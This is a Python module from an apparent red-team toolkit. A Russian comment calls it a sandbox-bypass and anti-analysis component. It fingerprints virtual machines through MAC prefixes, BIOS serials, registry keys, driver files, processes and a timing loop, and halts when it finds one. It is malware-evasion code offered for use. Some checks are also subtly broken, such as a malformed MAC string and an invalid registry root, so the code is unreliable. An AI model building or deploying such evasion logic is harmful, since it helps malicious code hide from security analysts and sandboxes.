# redteam_toolkit/evasion/sandbox_bypass/check_vm_artifacts.py
# Промышленный антианализ и VM-детектор для обхода песочниц и отладчиков

import os
import sys
import time
import ctypes
import platform
import subprocess
import psutil
import socket
import uuid
import winreg
from pathlib import Path

BLACKLISTED_MACS = [
    "00:05:69", "00:0C:29", "00:1C:14", "00:50:56", "08:00:27", "0A:00:27"
]

VM_PROCESSES = [
    "vboxservice.exe", "vboxtray.exe", "vmtoolsd.exe", "vmwaretray.exe",
    "vmwareuser.exe", "VGAuthService.exe", "vmacthlp.exe", "qemu-ga.exe"
]

SUSPICIOUS_DRIVERS = [
    "VBoxMouse.sys", "VBoxGuest.sys", "VBoxSF.sys", "VBoxVideo.sys",
    "vmmouse.sys", "vmhgfs.sys", "vm3dgl.dll", "vm3dver.dll"
]

SUSPICIOUS_FILES = [
    "C:\\windows\\System32\\drivers\\vmmouse.sys",
    "C:\\windows\\System32\\drivers\\vmhgfs.sys",
    "C:\\windows\\System32\\drivers\\VBoxGuest.sys"
]

SUSPICIOUS_REG_KEYS = [
    r"SYSTEM\ControlSet001\Services\VBoxGuest",
    r"SOFTWARE\Oracle\VirtualBox Guest Additions",
    r"HARDWARE\ACPI\DSDT\VBOX__"
]

def check_mac_address():
    mac = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff)
                    for i in range(0, 2*6, 8)][::-1])
    return any(mac.upper().startswith(prefix) for prefix in BLACKLISTED_MACS)

def check_bios():
    try:
        output = subprocess.check_output("wmic bios get serialnumber", shell=True)
        return b"VMware" in output or b"VirtualBox" in output
    except Exception:
        return False

def check_registry_keys():
    for key_path in SUSPICIOUS_REG_KEYS:
        try:
            root, subkey = key_path.split("\\", 1)
            root_const = getattr(winreg, root)
            with winreg.OpenKey(root_const, subkey):
                return True
        except FileNotFoundError:
            continue
    return False

def check_files():
    return any(Path(p).exists() for p in SUSPICIOUS_FILES)

def check_drivers():
    try:
        output = subprocess.check_output("driverquery", shell=True).decode()
        return any(driver in output for driver in SUSPICIOUS_DRIVERS)
    except Exception:
        return False

def check_processes():
    return any(p.name().lower() in VM_PROCESSES for p in psutil.process_iter())

def timing_attack():
    start = time.time()
    for _ in range(10000000):
        pass
    delta = time.time() - start
    return delta < 0.3  # слишком быстро — вероятно, песочница

def is_sandbox_env():
    checks = {
        "MAC": check_mac_address(),
        "BIOS": check_bios(),
        "RegKeys": check_registry_keys(),
        "Files": check_files(),
        "Drivers": check_drivers(),
        "Processes": check_processes(),
        "Timing": timing_attack()
    }
    suspicious = [k for k, v in checks.items() if v]
    if suspicious:
        print(f"[!] Sandbox/VM Detected via: {', '.join(suspicious)}")
        return True
    return False

if __name__ == "__main__":
    if is_sandbox_env():
        print("[-] Execution halted: sandbox detected.")
        sys.exit(0)
    else:
        print("[+] Environment looks clean. Continuing execution.")
